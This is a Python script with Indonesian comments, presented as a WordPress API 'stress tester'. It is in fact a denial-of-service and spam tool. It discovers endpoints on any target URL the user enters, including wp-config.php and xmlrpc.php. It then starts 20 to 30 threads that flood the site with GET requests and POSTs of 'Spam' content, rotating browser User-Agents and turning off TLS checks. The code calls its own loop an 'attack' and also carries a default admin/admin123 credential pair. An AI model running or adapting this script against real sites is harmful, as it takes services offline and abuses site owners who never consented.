import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WordPressAPITester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }
        self.endpoints = [
            "wp-json/wp/v2/posts", 
            "wp-json/wp/v2/users",
            "wp-json/wp/v2/comments",
            "wp-json",
            "wp-admin",
            "wp-login.php",
            "xmlrpc.php",
            "wp-includes",
            "wp-content",
            "wp-json/wp/v2/pages",
            "wp-json/wp/v2/categories",
            "wp-json/wp/v2/tags",
            "wp-json/wp/v2/media",
            "wp-cron.php",
            "wp-links-opml.php"
        ]
        self.payloads = {
            "auth_test": {"username": "admin", "password": "admin123"},
            "post_test": {"title": "Spam", "content": "Spam Content", "status": "publish"},
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def verify_endpoint(self, url, endpoint):
        """Verifikasi ketersediaan endpoint sebelum melakukan test"""
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        try:
            response = requests.head(
                full_url,
                headers={"User-Agent": self.get_random_user_agent()},
                timeout=3,
                verify=False,
                allow_redirects=True
            )
            return 200 <= response.status_code < 404
        except:
            return False

    def discover_valid_endpoints(self, url):
        """Menemukan endpoint yang valid"""
        print("[INFO] Discovering valid endpoints...")
        valid_endpoints = []
        
        # Tambahkan endpoint discovery khusus WordPress
        additional_endpoints = [
            "index.php",
            "readme.html",
            "license.txt",
            "wp-config.php",
            "wp-load.php",
            "wp-mail.php",
            "wp-settings.php",
            "wp-trackback.php",
            "wp-blog-header.php",
            "wp-json/wp/v2/settings",
            "wp-json/wp/v2/themes",
            "wp-json/wp/v2/plugins"
        ]
        
        self.endpoints.extend(additional_endpoints)
        
        for endpoint in self.endpoints:
            if self.verify_endpoint(url, endpoint):
                print(f"[SUCCESS] Found valid endpoint: {endpoint}")
                valid_endpoints.append(endpoint)
        
        if not valid_endpoints:
            print("[WARNING] No valid endpoints found. Using default endpoints.")
            return self.endpoints
        
        return valid_endpoints

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        # Tambahkan header yang sering digunakan WordPress
        additional_headers = {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Origin": url,
            "Referer": url,
            "X-WP-Nonce": self.get_wp_nonce(url)
        }
        self.headers.update(additional_headers)
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            else:
                if data:
                    # Tambahkan parameter yang sering digunakan WordPress
                    data.update({
                        "_wpnonce": self.get_wp_nonce(url),
                        "_wp_http_referer": url
                    })
                
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            if response.status_code in [404, 403]:
                return None
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def get_wp_nonce(self, url):
        """Mendapatkan WordPress nonce untuk autentikasi"""
        try:
            response = requests.get(
                f"{url.rstrip('/')}/wp-json",
                headers={"User-Agent": self.get_random_user_agent()},
                verify=False
            )
            # Dalam implementasi sebenarnya, ekstrak nonce dari response
            return "dummy_nonce"
        except:
            return None

    def flood(self, url, workers=30, duration=3600):
        print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
        
        # Temukan endpoint yang valid terlebih dahulu
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            print("[ERROR] No valid endpoints found. Aborting test.")
            return
            
        self.endpoints = valid_endpoints
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("post_test") if method == "POST" else None
                result = self.send_request(method, url, endpoint, data=payload)
                if result:
                    time.sleep(random.uniform(0.1, 0.3))  # Kurangi delay jika request berhasil
                else:
                    time.sleep(random.uniform(0.5, 1.0))  # Tambah delay jika request gagal

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Masukan Target URL wordpress(e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = WordPressAPITester()
        tester.flood(target_url, workers=20, duration=120)  # Serangan selama 2 menit
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
